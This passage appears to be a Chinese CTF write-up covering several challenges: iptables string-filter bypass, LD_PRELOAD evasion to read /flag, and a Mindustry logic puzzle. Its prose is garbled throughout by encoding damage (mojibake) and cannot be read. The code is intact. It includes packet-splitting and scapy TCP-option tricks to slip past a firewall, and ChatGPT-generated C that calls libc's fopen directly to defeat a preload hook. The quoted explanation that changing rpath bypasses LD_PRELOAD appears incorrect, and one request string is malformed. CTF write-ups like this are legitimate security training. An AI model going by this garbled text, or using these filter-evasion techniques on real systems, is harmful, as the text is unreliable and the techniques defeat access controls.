ç¬”è€…å°è¯•è¿‡çš„å‡ ç§å¸¸è§çš„æ— æŸå‹ç¼©æ ¼å¼è¾“å‡ºçš„å›¾ç‰‡å¤§å°ï¼š

| Type        | Size  |
| ----------- | ----- |
| PNG         | ~2kb  |
| AVIF (AV1)  | ~2kb  |
| HEIF (HEVC) | 552b  |
| WEBP (VP8)  | 176b  |
| EPS         | ~300b |
| SVG         | 170b  |
| SVGZ (GZIP) | 120b  |

ç¬”è€…å½“æ—¶ä¹Ÿå°è¯•äº†JPEG XLå’Œä»–çš„å‰èº«[FLIF](https://en.wikipedia.org/wiki/Free_Lossless_Image_Format)ï¼Œä¸è¿‡å°è¯•éƒ½é›†ä¸­åœ¨äº†æ€ä¹ˆè®©ä»–ç”¨ä¸åŒçš„åˆ†è¾¨ç‡ç¼–ç äº®åº¦å’Œé¢œè‰²ä¿¡æ¯ç­‰ï¼Œç°åœ¨çœ‹æ¥åè€Œæ˜¯ç ”ç©¶imagemagickçš„[canvas](https://legacy.imagemagick.org/Usage/canvas/)æŒ‡ä»¤æ¯”è¾ƒç¬¦åˆé¢˜ç›®çš„æƒ³æ³•ã€‚

## Komm, sÃ¼sser Flagge

### æˆ‘çš„ POST

iptablesçš„string filteråªåœ¨ä¸€ä¸ªåŒ…å†…åŒ¹é…ï¼ŒæŠŠPOå’ŒSTåˆ†å¼€å‘å°±è¡Œã€‚

```python
import socket

def send_http_request():
    # åˆ›å»ºä¸€ä¸ªsocketå¯¹è±¡
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # è¿æ¥åˆ°æœåŠ¡å™¨
    s.connect(("202.38.93.111", 18081))

    # å‘é€è¯·æ±‚çš„ç¬¬ä¸€éƒ¨åˆ†
    request_part1 = "PO"
    s.sendall(request_part1.encode())

    # å‘é€è¯·æ±‚çš„ç¬¬äºŒéƒ¨åˆ†
    request_part2 = "ST / HTTP/1.1\r\nHost: 202.38.93.111:18080\r\nContent-Length: 100\r\n\r\k="
    s.sendall(request_part2.encode())

    # æ¥æ”¶å“åº”
    response = s.recv(4096)
    print(response.decode())

    # å…³é—­socket
    s.close()

send_http_request()
```

### æˆ‘çš„ P

ä¸çŸ¥é“ä¸ºå•¥ï¼Œç”¨ç¬¬ä¸€é—®çš„ä»£ç ä¹Ÿè¿‡äº†ã€‚

### æˆ‘çš„ GETï¼ˆéé¢„æœŸï¼‰

```
-A myTCP-3 -p tcp -m string --algo bm --from 0 --to 50 --string "GET / HTTP" -j ACCEPT
-A myTCP-3 -p tcp -j REJECT --reject-with tcp-reset
```

è¿™ä¸¤è¡Œiptablesçš„æ„æ€å¤§æ¦‚æ˜¯åªå…è®¸åŒ…å‰50ä¸ªbyteå«æœ‰`GET / HTTP`çš„åŒ…é€šè¿‡ï¼Œå› æ­¤æˆ‘ä»¬åœ¨SYNï¼ŒSYNACKçš„æ—¶å€™éƒ½éœ€è¦æŠŠ`GET / HTTP`å¡è¿›åŒ…é‡Œé¢ã€‚ç¬”è€…å°è¯•ç”¨`scapy`æ„é€ äº†TCPåŒ…ã€‚

æœ€å¼€å§‹ç¬”è€…æ‰“ç®—ç”¨HTTP Pipeliningï¼Œåœ¨å‘SYNACKçš„æ—¶å€™ç›´æ¥æŠŠGETå’ŒPOSTä¸€èµ·å‘è¿‡å»ï¼Œä¸è¿‡å‘ç°goçš„httpåº“ä¼¼ä¹ä¸å¤ªæ”¯æŒè¿™æ ·çš„è¡Œä¸ºï¼Œåªèƒ½è¿”å›ç¬¬ä¸€ä¸ªGETçš„ç»“æœï¼Œå› æ­¤åæ¥å°è¯•äº†æŠŠ`GET / HTTP`å¡è¿›TCP Optionsé‡Œï¼ˆç¬”è€…ä¹Ÿå°è¯•è¿‡å¡IP Optionsé‡Œï¼Œä¸è¿‡optionä¼¼ä¹ä¼šè¢«é“¾è·¯ä¸Šçš„æŸäº›è·¯ç”±å™¨ä¸¢æ‰ï¼Œæ‰€ä»¥å°±æ”¹ç”¨äº†TCP Optionsäº†ï¼‰ï¼Œè¿™æ ·å€’ä¹Ÿä¸ä¼šè®©é‚£ä¸ªgoç¨‹åºæŠŠè¯¯è®¤ä¸ºæˆ‘åœ¨GETäº†ã€‚

```python
from scapy.all import *
import random
# è®¾ç½®ç›®æ ‡IPå’Œç«¯å£
sport = 13377
dport = 18082
src = "SRC-IP"
dst = "202.38.93.111"
iface = "eth0"

pld = b"GET / HTTP"
tcpopt = b"\xfa%s%s" % ((len(pld)+2).to_bytes(), pld) # length 12

ether = Ether(type=0x800, dst="MAC ADDR", src="MAC ADDR")
ip = IP(src=src, dst=dst)

seqstart = random.randint(1000,5000)

# æ„å»ºå¹¶å‘é€SYNåŒ…
SYN = TCP(sport=sport, dport=dport, flags='S', seq=seqstart)
xsyn = ether / ip / SYN / "GET / HTTP"
packet = xsyn.build()
sendp(packet, iface=iface, verbose=0)

# ç›´æ¥æ¥æ”¶ä»ç›®æ ‡IPåœ°å€è¿”å›çš„ç¬¬ä¸€ä¸ªåŒ…
syn_ack = sniff(iface=iface, filter=f"ip src {dst}", count=1, timeout=5)
if not syn_ack:
    print("SYN-ACK not received.")
    sys.exit()

syn_ack = syn_ack[0]
print(syn_ack)
# æ„å»ºå¹¶å‘é€ACKåŒ…
ACK = TCP(sport=sport, dport=dport, flags='A', seq=syn_ack[TCP].ack, ack=syn_ack[TCP].seq + 1, options=[(66, "GET / HTTP"), ("EOL", None)])
http_payload = "GET / HTTP/1.1\r\nHost: a\r\n\r\nPOST / HTTP/1.1\r\nX-A: GET / HTTP\r\nHost: srv\r\nContent-Length: 15\r\n114514:asdfgh==\r\n\r\n"
xack = ether / ip / ACK / http_payload
sendp(xack.build(), iface=iface, verbose=1)

```

åœ¨è¿è¡Œä¹‹å‰å¯èƒ½éœ€è¦ç”¨iptablesä¸¢æ‰å®¢æˆ·ç«¯å¾€æœåŠ¡ç«¯å‘çš„RSTå’ŒæœåŠ¡ç«¯å¾€å®¢æˆ·ç«¯å‘çš„RSTï¼Œä»¥å…è®©å®¢æˆ·ç«¯å‘å‡ºçš„resetï¼ˆæ£€æµ‹åˆ°ä¸è§„èŒƒçš„tcpåŒ…æ—¶å®¢æˆ·ç«¯ä¼šå‘å‡ºï¼‰å½±å“æœåŠ¡ç«¯ï¼Œå¯å‚è€ƒ[linux - How to make all outgoing RST drop - Stack Overflow](https://stackoverflow.com/questions/13215135/how-to-make-all-outgoing-rst-drop)

## ä¸ºä»€ä¹ˆè¦æ‰“å¼€ /flag ğŸ˜¡

### LD_PRELOAD, love!

æ ¹æ®é¢˜ç›®æœ¬èº«çš„æç¤ºï¼Œè¿™é¢˜å¯èƒ½å’Œå‡ºé¢˜äººç¼–è¯‘çš„é‚£ä¸ªsoæ–‡ä»¶è¢«åŠ è¿›äº†`LD_PRELOAD`æœ‰å…³ï¼Œé‚£æˆ‘ä»¬æäº¤ä¸Šå»çš„ç¨‹åºåˆ»æ„æ— è§†ä»–å°±è¡Œã€‚*è¿™é“é¢˜ç”±äºç¬”è€…ä¸å¤ªæ‡‚ç³»ç»Ÿè°ƒç”¨ï¼Œå› æ­¤è¿™æ ·é—®äº†chatgpt*ï¼š

````
```
stage1.soçš„ä»£ç 
```
æˆ‘çš„CTFæ¯”èµ›é‡Œæœ‰ä¸€é“é¢˜ï¼Œä¸»åŠæ–¹æä¾›äº†ä¸€ä¸ªstage1.so(ä¸Šæ–¹ä»£ç ï¼‰ï¼ŒæŠŠæ‰“å¼€/flagçš„è¯·æ±‚éƒ½å®šå‘åˆ°/fakeflagäº†ï¼Œè¿™æ˜¯dockerfileï¼š
```
COPY --from=builder /lib.so /stage1.so
ENV STAGE=1
RUN echo "I'll not let you open /flag again!" > /fakeflag
RUN echo "Upload your binary to server to get real flag!" > /flag
```
ä¸»åŠæ–¹æç¤ºè¿™é“é¢˜å¯èƒ½å’ŒLD_PRELOADæœ‰å…³ã€‚ä½ èƒ½å¸®æˆ‘å†™ä¸€ä¸ªlinux ELFæ–‡ä»¶ï¼Œæ¥åšåˆ°è¿™ç‚¹ä»¥åŠè¯»ä¸€ä¸‹flagçš„å†…å®¹å¹¶æ‰“å°å—ã€‚è¯·æ³¨æ„ï¼Œæˆ‘åªèƒ½ä¸Šä¼ ä¸€ä¸ªELFæ–‡ä»¶åˆ°ä¸»åŠæ–¹çš„è¿™ä¸ªdockeræ‰§è¡Œï¼Œè€Œä¸”æˆ‘æ²¡æœ‰åŠæ³•åœ¨å®ƒçš„shellé‡Œè®¾ç½®ä»»ä½•LDå˜é‡ã€‚
````

chatgptçš„å›ç­”ï¼š

````
ç”±äºæ‚¨æåˆ°æ— æ³•åœ¨ä¸»åŠæ–¹çš„Dockerç¯å¢ƒä¸­è®¾ç½®ä»»ä½•LDå˜é‡ï¼Œæ‚¨éœ€è¦ä½¿ç”¨ä¸€ç§ä¸ä¾èµ–äºç¯å¢ƒå˜é‡çš„æ–¹æ³•æ¥ç»•è¿‡`stage1.so`çš„é™åˆ¶ã€‚å¹¸è¿çš„æ˜¯ï¼Œæœ‰ä¸€ç§æ–¹æ³•å¯ä»¥åšåˆ°è¿™ä¸€ç‚¹ï¼šæ‚¨å¯ä»¥ç›´æ¥åœ¨ELFæ–‡ä»¶ä¸­ä¿®æ”¹åŠ¨æ€é“¾æ¥å™¨çš„æœç´¢è·¯å¾„ã€‚

ä¸‹é¢æ˜¯ä¸€ç§å¯èƒ½çš„è§£å†³æ–¹æ¡ˆï¼š

1. ç¼–å†™ä¸€ä¸ªCç¨‹åºï¼Œè¯¥ç¨‹åºå°è¯•æ‰“å¼€å¹¶è¯»å–`/flag`æ–‡ä»¶çš„å†…å®¹ã€‚
2. åœ¨Cç¨‹åºä¸­ï¼Œæ·»åŠ ä¸€ä¸ªæ„é€ å‡½æ•°ï¼ˆä½¿ç”¨`__attribute__((constructor))`ï¼‰ï¼Œåœ¨ä¸»å‡½æ•°æ‰§è¡Œä¹‹å‰è°ƒç”¨è¿™ä¸ªå‡½æ•°ã€‚åœ¨è¿™ä¸ªæ„é€ å‡½æ•°ä¸­ï¼Œä½¿ç”¨`dlopen`å’Œ`dlsym`æ¥ç›´æ¥è°ƒç”¨åŸå§‹çš„æ–‡ä»¶æ‰“å¼€å’Œè¯»å–å‡½æ•°ï¼Œç»•è¿‡`stage1.so`çš„é‡å®šå‘ã€‚
3. ç¼–è¯‘è¿™ä¸ªç¨‹åºï¼Œç”Ÿæˆä¸€ä¸ªELFæ–‡ä»¶ã€‚
4. ä½¿ç”¨`patchelf`æˆ–å…¶ä»–å·¥å…·ä¿®æ”¹ELFæ–‡ä»¶ï¼Œå°†åŠ¨æ€é“¾æ¥å™¨çš„æœç´¢è·¯å¾„è®¾ç½®ä¸ºä¸€ä¸ªä¸å­˜åœ¨çš„è·¯å¾„ã€‚è¿™æ ·ï¼Œå½“æ‚¨çš„ç¨‹åºå°è¯•åŠ è½½`stage1.so`æ—¶ï¼Œå®ƒå°†æ‰¾ä¸åˆ°è¯¥åº“ï¼Œä»è€Œç»•è¿‡äº†é‡å®šå‘ã€‚

ä¸‹é¢æ˜¯ä¸€ä¸ªç¤ºä¾‹Cç¨‹åºï¼Œå®ƒå°è¯•æ‰“å¼€å¹¶è¯»å–`/flag`æ–‡ä»¶çš„å†…å®¹ï¼Œå¹¶åœ¨æ„é€ å‡½æ•°ä¸­ç»•è¿‡`stage1.so`çš„é™åˆ¶ï¼š

```c
#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>

__attribute__((constructor))
void preload() {
    void *handle = dlopen("/lib/x86_64-linux-gnu/libc.so.6", RTLD_LAZY);
    if (!handle) {
        fprintf(stderr, "Cannot open libc.so.6: %s\n", dlerror());
        exit(EXIT_FAILURE);
    }

    FILE *(*original_fopen)(const char *, const char *) = dlsym(handle, "fopen");
    if (!original_fopen) {
        fprintf(stderr, "Cannot find fopen: %s\n", dlerror());
        exit(EXIT_FAILURE);
    }

    FILE *fp = original_fopen("/flag", "r");
    if (!fp) {
        fprintf(stderr, "Cannot open /flag\n");
        exit(EXIT_FAILURE);
    }

    char buf[1024];
    if (fgets(buf, sizeof(buf), fp) != NULL) {
        printf("/flag content: %s", buf);
    } else {
        fprintf(stderr, "Cannot read from /flag\n");
    }

    fclose(fp);
    dlclose(handle);
}

int main() {
    printf("If you see this message, the constructor has finished executing.\n");
    return 0;
}
```

ç¼–è¯‘è¿™ä¸ªç¨‹åºï¼š

```bash
gcc -o myprogram myprogram.c -ldl
```

ç„¶åä½¿ç”¨`patchelf`ä¿®æ”¹ELFæ–‡ä»¶ï¼š

```bash
patchelf --set-rpath /nonexistent myprogram
```

è¿™æ ·ï¼Œå½“æ‚¨ä¸Šä¼ å¹¶æ‰§è¡Œè¿™ä¸ªELFæ–‡ä»¶æ—¶ï¼Œå®ƒåº”è¯¥èƒ½å¤Ÿç»•è¿‡`stage1.so`çš„é™åˆ¶ï¼Œç›´æ¥æ‰“å¼€å¹¶è¯»å–`/flag`æ–‡ä»¶çš„å†…å®¹ã€‚
````

ChatGPTçš„æ€è·¯åº”è¯¥æ˜¯åˆ¶å®šäº†ä¸€ä¸ªä¸å­˜åœ¨åŠ¨æ€é“¾æ¥å™¨çš„æœç´¢è·¯å¾„ï¼ˆæœ¬è´¨åº”è¯¥å’Œ`LD_PRELOAD`ç±»ä¼¼ï¼‰ï¼Œè¿™æ ·ç¨‹åºå°±ä¼šæ— è§†ç°æœ‰çš„`LD_PRELOAD`é‡Œçš„soæ–‡ä»¶äº†ã€‚

æ²¡æƒ³åˆ°æŠŠChatGPTçš„ä»£ç äº¤ä¸Šå»ä¹‹åå°±ä¸€æ¬¡æ‹¿åˆ°flagäº†ã€‚

## å¼‚æ˜Ÿæ­§é€”

ä¸‹è½½æ¸¸æˆç©ä¸€ç©ä¹‹åï¼Œå¯ä»¥æ³¨æ„åˆ°æ¯8ä¸ªå¼€å…³éƒ½æ˜¯ç”±ä¸€ä¸ª[processor](https://mindustry-unofficial.fandom.com/wiki/Guide:_Logic_Basics)æ§åˆ¶çš„ã€‚

![å¤„ç†å™¨çš„å…³è”å»ºç­‘](assets/mindustry-1.jpg)

ç‚¹è¿›ç¼–è¾‘ä¹‹åå¯ä»¥çœ‹åˆ°è‹¥å¹²é€»è¾‘å›¾ï¼Œæˆ–è€…ä¹Ÿå¯ä»¥å¤åˆ¶å‡ºæ–‡æœ¬çœ‹ã€‚

![é€»è¾‘ç•Œé¢](assets/mindustry-logic.png)

### ç¬¬ä¸€ç»„

```
sensor s1 switch1 @enabled
sensor s2 switch2 @enabled
sensor s3 switch3 @enabled
sensor s4 switch4 @enabled
sensor s5 switch5 @enabled
sensor s6 switch6 @enabled
sensor s7 switch7 @enabled
sensor s8 switch8 @enabled
jump 18 equal s1 false
jump 18 equal s2 true
jump 18 equal s3 false
jump 18 equal s4 true
jump 18 equal s5 true
jump 18 equal s6 false
jump 18 equal s7 true
jump 18 equal s8 false
control enabled generator1 1 0 0 0
end
control enabled generator1 0 0 0 0
end
```

å¯ä»¥çœ‹å‡ºS1åˆ°S8éœ€è¦æŒ‰ç…§`10100101`é…ç½®å°±èƒ½å¯åŠ¨`generator1`ã€‚

### ç¬¬äºŒç»„

```
sensor sw1 switch1 @enabled
sensor sw2 switch2 @enabled
sensor sw3 switch3 @enabled
sensor sw4 switch4 @enabled
sensor sw5 switch5 @enabled
sensor sw6 switch6 @enabled
sensor sw7 switch7 @enabled
sensor sw8 switch8 @enabled
op shl t sw1 7
set number t
op shl t sw2 6
op add number number t
op shl t sw3 5
op add number number t
op shl t sw4 4
op add number number t
op shl t sw5 3
op add number number t
op shl t sw6 2
op add number number t
op shl t sw7 1
op add number number t
set t sw8
op add number number t
set en 0
set i 0
jump 33 greaterThanEq i 16
op pow fl0 i 2
jump 31 notEqual fl0 number
set en 1
jump 33 always x false
op add i i 1
jump 26 always x false
op equal fl1 0 sw1
op equal fl2 0 sw6
op or fl3 fl1 fl2
jump 38 equal fl3 0
set en 0
control enabled generator1 en 0 0 0
control enabled panel1 en 0 0 0
end
```

- `number`æ˜¯ç”¨ä½ç§»ç”Ÿæˆçš„ï¼Œå¤§æ¦‚ç±»ä¼¼äº`number = sw1*128 + sw2*64 + sw3*32 + sw4*16 + sw5*8 + sw6*4 + sw7*2 + sw8*1`ï¼Œç„¶ånumberéœ€è¦æ˜¯ä¸€ä¸ªå°äº225çš„å¹³æ–¹æ•°ã€‚
- `sw1`å’Œ`sw6`éœ€è¦æ˜¯å¼€çŠ¶æ€ï¼ˆç›¸å½“äºå·²ç»æœ‰128+4=132äº†ï¼‰ï¼Œæ³¨æ„åˆ°196=14^2ï¼›196-132=64ï¼Œé‚£æ‰“å¼€`sw2`å°±å¯ä»¥äº†ã€‚

`11000100`

### ç¬¬ä¸‰ç»„

```
sensor sw1 switch1 @enabled
sensor sw2 switch2 @enabled
sensor sw3 switch3 @enabled
sensor sw4 switch4 @enabled
sensor sw5 switch5 @enabled
sensor sw6 switch6 @enabled
sensor sw7 switch7 @enabled
sensor sw8 switch8 @enabled
sensor sw9 switch9 @enabled
control enabled conveyor2 sw1 0 0 0
control enabled gate1 sw2 0 0 0
op equal nsw3 sw3 0
control enabled reactor1 nsw3 0 0 0
control enabled reactor2 nsw3 0 0 0
control enabled conduit1 sw4 0 0 0
control enabled conduit2 sw4 0 0 0
control enabled mixer1 sw5 0 0 0
control enabled extractor1 sw6 0 0 0
control enabled meltdown1 sw7 0 0 0
control enabled meltdown2 sw7 0 0 0
op equal result sw8 sw9
jump 28 equal result true
control enabled mixer1 0 0 0 0
control enabled conduit2 1 0 0 0
control enabled reactor1 1 0 0 0
control enabled reactor2 1 0 0 0
control enabled conveyor2 1 0 0 0
wait 5
end
```

ç›®æ ‡ï¼šæ‰“å¼€extractor1ï¼Œmixer1ï¼Œreactor1ï¼Œreactor2ï¼Œconveyor2ï¼Œgate1ï¼Œä½†ä¸èƒ½æ‰“å¼€conduit1ï¼Œconduit2

- 1-8 è¡Œï¼šå®šä¹‰äº†8ä¸ªä¼ æ„Ÿå™¨ï¼Œå¹¶å°†å®ƒä»¬è¿æ¥åˆ°å„è‡ªçš„å¼€å…³ï¼ˆswitch1 - switch9ï¼‰ä¸Šï¼Œè¿™äº›å¼€å…³è¢«å‘½åä¸ºsw1åˆ°sw9ã€‚

- 9-14 è¡Œï¼šè¿™äº›è¡Œè®¾ç½®äº†å‡ ä¸ªå»ºç­‘çš„æ§åˆ¶é€»è¾‘ã€‚`control enabled` å‘½ä»¤ç”¨äºå¯ç”¨æˆ–ç¦ç”¨ç‰¹å®šçš„å»ºç­‘ã€‚å»ºç­‘çš„å¯ç”¨/ç¦ç”¨çŠ¶æ€å–å†³äºç›¸åº”ä¼ æ„Ÿå™¨çš„çŠ¶æ€ï¼ˆ0ä»£è¡¨ç¦ç”¨ï¼Œ1ä»£è¡¨å¯ç”¨ï¼‰ã€‚åœ¨è¿™äº›è¡Œä¸­ï¼Œå½“ä¼ æ„Ÿå™¨çš„çŠ¶æ€ä¸º1ï¼ˆå³å¼€å…³è¢«æ¿€æ´»ï¼‰æ—¶ï¼Œç›¸åº”çš„å»ºç­‘ä¼šè¢«å¯ç”¨ã€‚

- 15-16 è¡Œï¼šåˆ›å»ºäº†ä¸€ä¸ªåä¸ºnsw3çš„æ–°å˜é‡ï¼Œå¹¶å°†å…¶å€¼è®¾ç½®ä¸ºä¸sw3ç›¸ç­‰ã€‚è¿™æ„å‘³ç€nsw3çš„å€¼å°†æ ¹æ®sw3çš„çŠ¶æ€å˜åŒ–ã€‚

- 17-20 è¡Œï¼šå½“nsw3ä¸º1ï¼ˆå³sw3è¢«æ¿€æ´»ï¼‰æ—¶ï¼Œå¯ç”¨reactor1ã€reactor2ã€conduit1å’Œconduit2ã€‚

- 21-23 è¡Œï¼šå½“sw5ä¸º1æ—¶ï¼Œå¯ç”¨mixer1ï¼›å½“sw6ä¸º1æ—¶ï¼Œå¯ç”¨extractor1ï¼›å½“sw7ä¸º1æ—¶ï¼Œå¯ç”¨meltdown1å’Œmeltdown2ã€‚**â€”â€”æ‰“å¼€sw5ï¼Œsw6**

- 24-26 è¡Œï¼šæ¯”è¾ƒsw8å’Œsw9çš„çŠ¶æ€ï¼Œå¹¶å°†ç»“æœå­˜å‚¨åœ¨å˜é‡resultä¸­ã€‚å¦‚æœsw8å’Œsw9éƒ½æ˜¯1æˆ–éƒ½æ˜¯0ï¼Œresultå°†ä¸ºtrueã€‚**â€”â€”sw8å·²ç»å…³äº†ï¼Œæ‰€ä»¥sw9ä¹Ÿè¦å…³ä¸Š**

- 27 è¡Œï¼šå¦‚æœresultä¸ºtrueï¼ˆå³sw8å’Œsw9çš„çŠ¶æ€ç›¸ç­‰ï¼‰ï¼Œåˆ™è·³è½¬åˆ°ç¬¬28è¡Œã€‚

- 28-33 è¡Œï¼šå¦‚æœè·³è½¬å‘ç”Ÿï¼Œè¿™äº›è¡Œå°†è¢«æ‰§è¡Œã€‚è¿™äº›è¡Œå°†ç¦ç”¨mixer1ï¼Œå¯ç”¨conduit2ã€reactor1ã€reactor2å’Œconveyor2ã€‚

- 34 è¡Œï¼šç­‰å¾…5ä¸ªæ¸¸æˆé€»è¾‘å¸§ã€‚

- 35 è¡Œï¼šè„šæœ¬ç»“æŸã€‚
- sw1æ§åˆ¶conveyor2ã€‚**â€”â€”æ‰“å¼€sw1**

`10001100`

å…¶ä»–æ–¹æ³•ï¼š~~æœåŠ¡å™¨å…è®¸10ç§’æäº¤ä¸€æ¬¡åºåˆ—ï¼Œ8ä½äºŒè¿›åˆ¶æ•°ä¸€å…±å°±256ç§ç»„åˆï¼Œè¿è¡Œä¸€ä¸ªå°æ—¶å°±èƒ½æ’å‡ºæ¥äº†~~

### ç¬¬å››ç»„

æ­£å¥½è¯•å‡ºæ¥äº†`01110111`

![æˆåŠŸè¿è¡Œåçš„çŠ¶æ€](assets/mindustry-2.jpg)

